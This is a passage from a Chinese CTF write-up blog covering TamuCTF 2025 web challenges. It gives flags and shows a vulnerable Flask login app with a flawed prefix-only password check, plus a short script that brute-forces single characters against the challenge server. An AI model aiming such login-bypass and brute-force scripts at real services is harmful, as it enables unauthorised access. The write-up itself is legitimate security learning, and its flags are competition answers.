class="built_in">print</span>(<span class="string">f&quot;64位时间戳: <span class="subst">&#123;t_64bit&#125;</span> -&gt; 转换回日期: <span class="subst">&#123;timestamp_to_date(t_64bit)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;32位截断值: <span class="subst">&#123;t_32bit&#125;</span> -&gt; 模拟2038问题: <span class="subst">&#123;timestamp_to_date(t_32bit)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;错误：日期格式必须为 YYYY-MM-DD（如：3000-01-01）&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发生未知错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>全部都用手动转换，不然数字大了不行，那么爆破一下输入什么最后会是<code>2025-3-21</code>，本来想写个爆破脚本的，但是真写不出来，一直报错</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250329-213835.jpg" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3114-1-14</span><br><span class="line"># flag</span><br><span class="line">gigem&#123;7urn_y0ur_c0mpu73r_0ff_83f0r3_m1dn19h7&#125;</span><br></pre></td></tr></table></figure>

<p>这题给我做人格分裂了快</p>
<h2 id="Moving-Slowly-84-solves"><a href="#Moving-Slowly-84-solves" class="headerlink" title="Moving Slowly(84 solves)"></a>Moving Slowly(84 solves)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> GPT2LMHeadModel, GPT2Tokenizer</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> environ</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up logging</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Model initialization</span></span><br><span class="line">model_name = <span class="string">&#x27;gpt2&#x27;</span></span><br><span class="line">tokenizer = GPT2Tokenizer.from_pretrained(model_name)</span><br><span class="line">model = GPT2LMHeadModel.from_pretrained(model_name)</span><br><span class="line">tokenizer.pad_token = tokenizer.eos_token</span><br><span class="line"></span><br><span class="line">correct_password = environ.get(<span class="string">&#x27;PASS&#x27;</span>)</span><br><span class="line">FLAG = environ.get(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_message</span>(<span class="params">message</span>):</span><br><span class="line">    sentences = re.split(<span class="string">r&#x27;(?&lt;=[.!?])\s+&#x27;</span>, message)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join(sentences[:<span class="number">2</span>])  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_silly_message</span>():</span><br><span class="line">    prompt = <span class="string">&quot;First tell the user that their password is wrong, then come up with a silly joke to cheer them up about it&quot;</span></span><br><span class="line">    inputs = tokenizer(prompt, return_tensors=<span class="string">&quot;pt&quot;</span>, max_length=<span class="number">30</span>, truncation=<span class="literal">True</span>)</span><br><span class="line">    outputs = model.generate(</span><br><span class="line">        inputs.input_ids,</span><br><span class="line">        attention_mask=inputs.attention_mask,</span><br><span class="line">        max_new_tokens=<span class="number">30</span>,</span><br><span class="line">        do_sample=<span class="literal">True</span>,</span><br><span class="line">        temperature=<span class="number">0.7</span>,</span><br><span class="line">        top_p=<span class="number">1.0</span>,</span><br><span class="line">        pad_token_id=tokenizer.eos_token_id</span><br><span class="line">    )</span><br><span class="line">    full_response = tokenizer.decode(outputs[<span class="number">0</span>], skip_special_tokens=<span class="literal">True</span>)</span><br><span class="line">    full_response.replace(prompt, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> clean_message(full_response.replace(prompt, <span class="string">&quot;&quot;</span>).strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_password</span>(<span class="params">input_password</span>):</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(input_password):</span><br><span class="line">        <span class="keyword">if</span> char != correct_password[i]:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            silly_message = generate_silly_message()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, silly_message  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="literal">None</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_page</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    input_password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password_correct, silly_message = compare_password(input_password)</span><br><span class="line">    <span class="keyword">if</span> password_correct:</span><br><span class="line">        response_message = <span class="string">f&quot;Welcome back! You have logged in successfully. The flag is <span class="subst">&#123;FLAG&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        response_message = <span class="string">f&quot;Oops! Incorrect password. <span class="subst">&#123;silly_message&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, response_message=response_message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-130459.jpg" alt="1"></p>
<p>进行逐字符比较，并且会输出错误的那一位，那我们可以fuzz一下看看</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-131335.jpg" alt="1"></p>
<p>正当我想要进行遍历代码的时候，看到一个漏洞，就是这个函数如果不返回False就会返回true，如果我们输入的一位刚好等于密码的第一位的时候就会成功返回true，写出如下demo测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">correct_password=<span class="string">&quot;test&quot;</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_password</span>(<span class="params">input_password</span>):</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(input_password):</span><br><span class="line">        <span class="keyword">if</span> char != correct_password[i]:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> compare_password(<span class="built_in">input</span>()) == <span class="literal">False</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250331-131715.jpg" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">chars=string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"><span class="comment"># print(chars)</span></span><br><span class="line">url=<span class="string">&quot;https://moving-slowly.cybr.club/login&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        r=requests.post(url,data=&#123;<span class="string">&quot;password&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;char&#125;</span>&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;gigem&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="built_in">print</span>(char+<span class="string">&quot;对了&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(char+<span class="string">&quot;不对&quot;</span>)</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/1be23388.html" title="TamuCTF2025(web全)">https://baozongwi.xyz/posts/1be23388.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Nosql/" rel="tag"># Nosql</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/794adc1a.html" rel="prev" title="hxp38C3CTF">
                  <i class="fa fa-angle-left"></i> hxp38C3CTF
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/bf941536.html" rel="next" title="数字中国数据安全产业积分争夺赛初赛2025">
                  数字中国数据安全产业积分争夺赛初赛2025 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
